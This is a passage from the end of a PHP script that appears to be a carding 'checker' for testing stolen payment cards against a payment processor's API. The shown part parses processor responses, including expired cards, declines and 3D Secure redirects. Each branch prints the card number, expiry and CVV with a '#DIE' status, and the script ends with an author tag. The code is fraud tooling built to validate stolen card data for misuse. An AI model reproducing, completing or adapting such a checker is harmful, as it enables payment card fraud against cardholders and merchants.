  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Do Not Honor ❌</i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Expired Card ❌</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Card Doesnt Support This Purchase ❌</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Processing Error ❌</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Service Not Allowed ❌</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>#DIE: Missing Card Details ❌</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Another Request In Process: Card Not Checked ❌</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Transaction Not Allowed ❌</i></font><br>";
}

elseif
(strpos($result2,  'Card is #DIE ▸cc check by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>3D Secure Redirect ❌</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Missing Payment Informations ❌</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Missing Credit Card Number ❌</i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>something went wrong check your api.. </i></font> <br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>site not working....</i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;
////////////////////////////===RAW BY HARIS===////////////////////////////
?>